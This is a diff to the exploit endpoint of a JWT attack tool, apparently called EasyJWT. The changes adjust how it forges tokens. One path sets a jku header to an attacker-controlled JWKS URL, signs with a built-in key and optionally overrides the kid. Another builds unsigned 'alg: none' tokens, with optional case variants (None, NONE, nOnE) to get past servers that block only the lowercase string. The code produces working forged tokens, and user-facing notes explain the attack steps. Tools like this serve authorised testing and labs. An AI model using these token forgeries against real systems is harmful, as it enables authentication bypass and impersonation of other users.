@@ -561,12 +561,17 @@ def exploit():
         # kid still signs with the same fixed key either way, this only
         # changes what the header CLAIMS its kid is. Matters when your
         # own hosted JWKS copy ended up under a different kid than ours
-        # (fetched via /api/fetch-jwks-kids, or typed by hand) and the
-        # target looks up keys by kid: it needs to match what's actually
-        # hosted, not EasyJWT's own internal name for this key.
+        # (fetched via /api/fetch-jwks-kids, or picked from the dropdown)
+        # and the target looks up keys by kid: it needs to match what's
+        # actually hosted, not EasyJWT's own internal name for this key.
+        # An empty kid_override means "Manual" was picked in the dropdown:
+        # leave whatever kid (if any) was already in the header alone,
+        # don't claim one at all. A non-empty value (the default kid, or
+        # one fetched from the URL) overwrites it, same as before.
         header["alg"] = "RS256"
         header["jku"] = target_jku
-        header["kid"] = kid_override or DEFAULT_JWKS_KID
+        if kid_override:
+            header["kid"] = kid_override
         if "typ" not in header:
             header["typ"] = None  # don't let PyJWT silently add one, see /api/forge
 
@@ -575,21 +580,28 @@ def exploit():
         except Exception as exc:
             return jsonify({"error": f"Could not sign the token: {exc}"}), 400
 
+        kid_note = (
+            f'kid set to "{header["kid"]}".'
+            if "kid" in header
+            else "kid left exactly as it was in the header (Manual was selected), which means "
+                 "no kid at all if the original token didn't have one."
+        )
+
         if jwks_url:
             note = (
                 f"Signed with EasyJWT's built-in default key, jku set to the URL you gave: {target_jku}, "
-                f"kid set to {header['kid']}.\n"
+                f"{kid_note}\n"
                 f"Make sure that URL actually serves a JWKS containing this exact key under that kid "
                 f"(visit {default_jwks_url} yourself and copy its \"keys\" entry into your JWKS body, "
-                "or use \"Fetch kid from URL\" above to read back whatever kid you actually hosted it "
-                "under) or the target won't find a matching key to verify this signature."
+                "or pick it from the kid dropdown above, which fetches from that URL automatically) "
+                "or the target won't find a matching key to verify this signature."
             )
         else:
             note = (
                 "No JWKS URL given, so jku points at EasyJWT's own hosted default key "
                 f"({default_jwks_url}). If the target server can't reach that domain, paste "
                 "your own URL above instead (e.g. a lab's exploit server) and host the same "
-                f"key there yourself, copied from {default_jwks_url}."
+                f"key there yourself, copied from {default_jwks_url}. {kid_note}"
             )
 
         output = f"{note}\n\nNew JWT:\n\n{new_token}"
@@ -612,7 +624,13 @@ def exploit():
         if not isinstance(header, dict) or not isinstance(payload, dict):
             return jsonify({"error": "Token header/payload must be JSON objects"}), 400
 
-        variants = ["none", "None", "NONE", "nOnE", "noNe"]
+        # Case variants are off by default (the "Include case variants"
+        # checkbox in the UI) so the common case, one plain "none" token,
+        # doesn't make you scroll past 4 extra boxes you probably don't
+        # need. Generating them costs nothing either way (it's just string
+        # formatting), this is purely about not cluttering the result.
+        include_variants = bool(data.get("none_variants"))
+        variants = ["none", "None", "NONE", "nOnE", "noNe"] if include_variants else ["none"]
         payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
         tokens = []
         for variant in variants:
@@ -621,13 +639,22 @@ def exploit():
             header_b64 = b64url_encode(json.dumps(variant_header, separators=(",", ":")).encode())
             tokens.append({"label": variant, "token": f"{header_b64}.{payload_b64}."})
 
-        output = (
-            "Re-signed with alg set to \"none\", plus 4 differently-cased spellings "
-            "of it, with the signature removed entirely. Some servers only block the "
-            "exact lowercase string and accept one of the others. For a custom "
-            "combination of your own, use Forge instead.\n\n"
-            + "\n\n".join(f"{t['label']}:\n{t['token']}" for t in tokens)
-        )
+        if include_variants:
+            note = (
+                "Re-signed with alg set to \"none\", plus 4 differently-cased spellings "
+                "of it, with the signature removed entirely. Some servers only block the "
+                "exact lowercase string and accept one of the others. For a custom "
+                "combination of your own, use Forge instead."
+            )
+        else:
+            note = (
+                "Re-signed with alg set to \"none\" and the signature removed "
+                "entirely. If the server blocks that exact string, tick "
+                "\"Include case variants\" and try again, some servers only "
+                "check for the lowercase spelling."
+            )
+
+        output = note + "\n\n" + "\n\n".join(f"{t['label']}:\n{t['token']}" for t in tokens)
         return jsonify({"output": output, "tokens": tokens})
 
     try:
